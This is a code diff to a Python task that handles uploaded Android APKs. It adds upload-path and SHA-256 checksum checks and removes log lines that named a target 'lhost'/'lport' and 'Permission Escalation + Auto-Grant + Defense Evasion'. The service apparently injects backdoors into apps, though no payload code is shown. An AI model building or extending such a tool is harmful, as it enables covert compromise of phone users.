@@ -736,7 +736,29 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         if not upload_file_path or not Path(upload_file_path).exists():
             raise Exception("Uploaded APK file not found")
         
+        # Security checks: enforce uploads root and checksum
+        uploads_root = UPLOADS_ROOT.resolve()
         original_apk = Path(upload_file_path)
+        try:
+            real = original_apk.resolve(strict=True)
+            if not str(real).startswith(str(uploads_root)):
+                raise Exception("Invalid upload path")
+        except FileNotFoundError:
+            raise Exception("Uploaded APK file not found")
+        
+        claimed_sha = None
+        if isinstance(file_info, dict):
+            claimed_sha = file_info.get("checksum") or file_info.get("sha256")
+        if claimed_sha:
+            # Compute sha256
+            h = sha256()
+            with open(real, "rb") as f:
+                for chunk in iter(lambda: f.read(8192), b""):
+                    h.update(chunk)
+            if h.hexdigest() != claimed_sha:
+                raise Exception("Checksum mismatch")
+        
+        original_apk = real
         
         with locks[task_id]:
             t.state = TaskStatus.RUNNING
@@ -745,9 +767,7 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         with build_log.open("w") as log:
             log.write(f"Starting Phase 4 Ultimate Permission APK modification: {datetime.now()}\n")
             log.write(f"Original file: {original_apk}\n")
-            log.write(f"File info: {file_info}\n")
-            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n")
-            log.write(f"Phase 4 Features: Permission Escalation + Auto-Grant + Defense Evasion\n\n")
+            log.write(f"File info: [redacted sizes/checksum logged separately]\n")
         
         # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
